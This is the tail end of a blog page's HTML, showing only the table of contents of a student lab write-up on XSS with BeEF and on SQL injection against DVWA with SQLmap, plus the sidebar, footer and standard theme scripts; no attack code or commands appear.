href="#%E6%B8%97%E9%80%8F%E5%AE%9E%E9%AA%8C%E4%B8%89xss%E4%B8%8Esql%E6%B3%A8%E5%85%A5"><span class="toc-number">1.</span> <span class="toc-text">渗透实验三xss与sql注入</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#XSS%E9%83%A8%E5%88%86%EF%BC%9A%E5%88%A9%E7%94%A8Beef%E5%8A%AB%E6%8C%81%E8%A2%AB%E6%94%BB%E5%87%BB%E8%80%85%E5%AE%A2%E6%88%B7%E7%AB%AF%E6%B5%8F%E8%A7%88%E5%99%A8"><span class="toc-number">2.</span> <span class="toc-text">XSS部分：利用Beef劫持被攻击者客户端浏览器</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%AE%9E%E9%AA%8C%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA"><span class="toc-number">2.1.</span> <span class="toc-text">实验环境搭建</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%88%A9%E7%94%A8AWVS%E6%89%AB%E6%8F%8F%E7%95%99%E8%A8%80%E7%B0%BF%E7%BD%91%E7%AB%99%EF%BC%8C%E5%8F%91%E7%8E%B0%E5%85%B6%E5%AD%98%E5%9C%A8XSS%E6%BC%8F%E6%B4%9E"><span class="toc-number">2.2.</span> <span class="toc-text">利用AWVS扫描留言簿网站，发现其存在XSS漏洞</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Kali%E4%BD%BF%E7%94%A8beef%E7%94%9F%E6%88%90%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81"><span class="toc-number">2.3.</span> <span class="toc-text">Kali使用beef生成恶意代码</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%AE%BF%E9%97%AE%E7%95%99%E8%A8%80%E7%B0%BF%E8%BF%9B%E8%A1%8C%E7%95%99%E8%A8%80"><span class="toc-number">2.4.</span> <span class="toc-text">访问留言簿进行留言</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8A%AB%E6%8C%81%E6%88%90%E5%8A%9F"><span class="toc-number">2.5.</span> <span class="toc-text">劫持成功</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#SQL%E6%B3%A8%E5%85%A5%E9%83%A8%E5%88%86%EF%BC%9ADVWA-SQLmap-Mysql%E6%B3%A8%E5%85%A5%E5%AE%9E%E6%88%98"><span class="toc-number">3.</span> <span class="toc-text">SQL注入部分：DVWA+SQLmap+Mysql注入实战</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%B3%A8%E5%85%A5%E7%82%B9%E5%8F%91%E7%8E%B0%EF%BC%8C%E9%A6%96%E5%85%88%E8%82%AF%E5%AE%9A%E6%98%AF%E8%A6%81%E5%88%A4%E6%96%AD%E6%98%AF%E5%90%A6%E6%9C%89%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E"><span class="toc-number">4.</span> <span class="toc-text">注入点发现，首先肯定是要判断是否有注入漏洞</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%9E%9A%E4%B8%BE%E5%BD%93%E5%89%8D%E4%BD%BF%E7%94%A8%E7%9A%84%E6%95%B0%E6%8D%AE%E5%BA%93%E5%90%8D%E7%A7%B0%E5%92%8C%E7%94%A8%E6%88%B7%E5%90%8D"><span class="toc-number">5.</span> <span class="toc-text">枚举当前使用的数据库名称和用户名</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%9E%9A%E4%B8%BE%E6%95%B0%E6%8D%AE%E5%BA%93%E7%94%A8%E6%88%B7%E5%90%8D%E5%92%8C%E5%AF%86%E7%A0%81"><span class="toc-number">6.</span> <span class="toc-text">枚举数据库用户名和密码</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%9E%9A%E4%B8%BE%E6%95%B0%E6%8D%AE%E5%BA%93%E5%92%8C%E6%8C%87%E5%AE%9A%E6%95%B0%E6%8D%AE%E5%BA%93%E7%9A%84%E6%95%B0%E6%8D%AE%E8%A1%A8"><span class="toc-number">7.</span> <span class="toc-text">枚举数据库和指定数据库的数据表</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E8%8E%B7%E5%8F%96%E6%8C%87%E5%AE%9A%E6%95%B0%E6%8D%AE%E5%BA%93%E5%92%8C%E8%A1%A8%E4%B8%AD%E6%89%80%E6%9C%89%E5%88%97%E7%9A%84%E4%BF%A1%E6%81%AF"><span class="toc-number">8.</span> <span class="toc-text">获取指定数据库和表中所有列的信息</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%9E%9A%E4%B8%BE%E6%8C%87%E5%AE%9A%E6%95%B0%E6%8D%AE%E8%A1%A8%E4%B8%AD%E7%9A%84%E6%89%80%E6%9C%89%E7%94%A8%E6%88%B7%E5%90%8D%E4%B8%8E%E5%AF%86%E7%A0%81-%E5%B9%B6down%E5%88%B0%E6%9C%AC%E5%9C%B0"><span class="toc-number">9.</span> <span class="toc-text">枚举指定数据表中的所有用户名与密码,并down到本地</span></a></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item"><a class="thumbnail" href="/posts/acdadd84/" title="WebDeveloper靶场练习"><img src= "/./img/loading.gif" data-lazy-src="https://owasp.org/Top10/assets/TOP_10_Icons_Final_Injection.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="WebDeveloper靶场练习"/></a><div class="content"><a class="title" href="/posts/acdadd84/" title="WebDeveloper靶场练习">WebDeveloper靶场练习</a><time datetime="2021-12-12T09:43:16.000Z" title="发表于 2021-12-12 17:43:16">2021-12-12</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/posts/b93b1d5c/" title="概率论复习"><img src= "/./img/loading.gif" data-lazy-src="https://cdn.corporatefinanceinstitute.com/assets/conditional-probability1-1024x768.jpeg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="概率论复习"/></a><div class="content"><a class="title" href="/posts/b93b1d5c/" title="概率论复习">概率论复习</a><time datetime="2021-12-09T09:48:17.000Z" title="发表于 2021-12-09 17:48:17">2021-12-09</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/posts/b42f4bd7/" title="vulnhub DC1 靶场练习"><img src= "/./img/loading.gif" data-lazy-src="https://gitee.com/csrcsyh/note/raw/master/img/20211202150620.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="vulnhub DC1 靶场练习"/></a><div class="content"><a class="title" href="/posts/b42f4bd7/" title="vulnhub DC1 靶场练习">vulnhub DC1 靶场练习</a><time datetime="2021-12-06T10:08:16.000Z" title="发表于 2021-12-06 18:08:16">2021-12-06</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/posts/b878f198/" title="渗透实验三xss与sql注入"><img src= "/./img/loading.gif" data-lazy-src="https://gitee.com/csrcsyh/note/raw/master/img/20211212231923.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="渗透实验三xss与sql注入"/></a><div class="content"><a class="title" href="/posts/b878f198/" title="渗透实验三xss与sql注入">渗透实验三xss与sql注入</a><time datetime="2021-12-06T10:08:16.000Z" title="发表于 2021-12-06 18:08:16">2021-12-06</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/posts/96e3061b/" title="OWASP TOP 10"><img src= "/./img/loading.gif" data-lazy-src="https://www.traceable.ai/wp-content/uploads/2021/09/6039c84e695ede694324b40d_owaspcode-1.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="OWASP TOP 10"/></a><div class="content"><a class="title" href="/posts/96e3061b/" title="OWASP TOP 10">OWASP TOP 10</a><time datetime="2021-12-02T07:07:59.000Z" title="发表于 2021-12-02 15:07:59">2021-12-02</time></div></div></div></div></div></div></main><footer id="footer"><div id="footer-wrap"><div class="copyright">&copy;2020 - 2021 By FakerCsr</div><div class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside_config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><a id="to_comment" href="#post-comment" title="直达评论"><i class="fas fa-comments"></i></a><button id="go-up" type="button" title="回到顶部"><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox.umd.js"></script><script src="https://cdn.jsdelivr.net/npm/vanilla-lazyload/dist/lazyload.iife.min.js"></script><div class="js-pjax"><script>function loadValine () {
+  function initValine () {
+    const valine = new Valine(Object.assign({
+      el: '#vcomment',
+      appId: 'M5w43MvVYoiXPql8oo3RpJy4-gzGzoHsz',
+      appKey: 'm85538OpXW57GohesiYS4mVT',
+      avatar: 'monsterid',
+      serverURLs: '',
+      emojiMaps: "",
+      path: window.location.pathname,
+      visitor: false
+    }, null))
+  }
+
+  if (typeof Valine === 'function') initValine() 
+  else getScript('https://cdn.jsdelivr.net/npm/valine/dist/Valine.min.js').then(initValine)
+}
+
+if ('Valine' === 'Valine' || !true) {
+  if (true) btf.loadComment(document.getElementById('vcomment'),loadValine)
+  else setTimeout(loadValine, 0)
+} else {
+  function loadOtherComment () {
+    loadValine()
+  }
+}</script></div><script type="text/javascript" src="./js/my.js"></script><div class="app-refresh" id="app-refresh"> <div class="app-refresh-wrap"> <label>✨ 网站已更新最新版本 👉</label> <a href="javascript:void(0)" onclick="location.reload()">点击刷新</a> </div></div><script>function showNotification(){if(GLOBAL_CONFIG.Snackbar){var t="light"===document.documentElement.getAttribute("data-theme")?GLOBAL_CONFIG.Snackbar.bgLight:GLOBAL_CONFIG.Snackbar.bgDark,e=GLOBAL_CONFIG.Snackbar.position;Snackbar.show({text:"已更新最新版本",backgroundColor:t,duration:5e5,pos:e,actionText:"点击刷新",actionTextColor:"#fff",onActionClick:function(t){location.reload()}})}else{var o=`top: 0; background: ${"light"===document.documentElement.getAttribute("data-theme")?"#49b1f5":"#1f1f1f"};`;document.getElementById("app-refresh").style.cssText=o}}"serviceWorker"in navigator&&(navigator.serviceWorker.controller&&navigator.serviceWorker.addEventListener("controllerchange",function(){showNotification()}),window.addEventListener("load",function(){navigator.serviceWorker.register("/sw.js")}));</script><script defer="defer" id="fluttering_ribbon" mobile="false" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/dist/canvas-fluttering-ribbon.min.js"></script><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/dist/activate-power-mode.min.js"></script><script>POWERMODE.colorful = true;
+POWERMODE.shake = false;
+POWERMODE.mobile = false;
+document.body.addEventListener('input', POWERMODE);
+</script><script id="click-show-text" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/dist/click-show-text.min.js" data-mobile="false" data-text="富强,民主,文明,和谐,自由,平等,公正,法治,爱国,敬业,诚信,友善" data-fontsize="15px" data-random="false" async="async"></script><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div></body></html>
